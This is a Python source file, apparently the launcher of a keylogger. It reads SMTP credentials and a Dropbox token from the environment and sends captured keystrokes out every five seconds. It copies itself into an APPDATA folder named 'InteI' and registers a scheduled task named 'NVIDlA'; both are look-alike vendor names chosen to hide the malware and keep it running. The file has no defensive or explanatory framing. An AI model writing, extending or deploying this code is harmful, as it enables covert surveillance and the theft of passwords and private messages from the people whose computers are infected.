import os
import psutil
from dotenv import load_dotenv
from keylogger import KeyLogger

load_dotenv()

SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
EMAIL_CC = os.getenv("EMAIL_CC")
DROPBOX_TOKEN = os.getenv("DROPBOX_TOKEN")

SEND_REPORT_EVERY = 5  # seconds
MAGIC_WORD = "stop"

SRC_FILE = "D:\main.exe"
DEST_FOLDER = os.path.join(os.getenv("APPDATA"), "InteI")
TASK_NAME = "NVIDlA"


def is_process_running(process_name):
    count = 0
    for proc in psutil.process_iter(attrs=["pid", "name"]):
        if proc.info["name"] == process_name:
            count += 1
    return count


def main():
    running_instances = is_process_running("main.exe")
    print(f"Number of 'main.exe' ongoing processes: {running_instances}")

    if running_instances >= 4:
        print("Too many ongoing processes. Exiting.")
        return

    keylogger = KeyLogger(
        time_interval=SEND_REPORT_EVERY,
        smtp_server=SMTP_SERVER,
        smtp_port=SMTP_PORT,
        email_address=EMAIL_ADDRESS,
        email_password=EMAIL_PASSWORD,
        email_sender=EMAIL_SENDER,
        email_receiver=EMAIL_RECEIVER,
        cc=EMAIL_CC,
        magic_word=MAGIC_WORD,
        dropbox_token=DROPBOX_TOKEN,
        src_file=SRC_FILE,
        dest_folder=DEST_FOLDER,
        task_name=TASK_NAME,
    )
    keylogger.run()


if __name__ == "__main__":
    main()
